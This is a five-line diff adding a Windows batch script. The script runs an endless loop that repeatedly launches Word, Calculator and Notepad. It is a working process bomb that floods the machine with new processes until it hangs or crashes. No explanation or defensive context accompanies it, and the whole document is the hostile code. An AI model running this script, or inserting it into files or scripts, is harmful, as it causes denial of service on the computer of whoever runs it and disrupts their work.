@@ -1,0 +1,5 @@
+:imp 
+start winword
+start calc
+start notepad
+goto imp
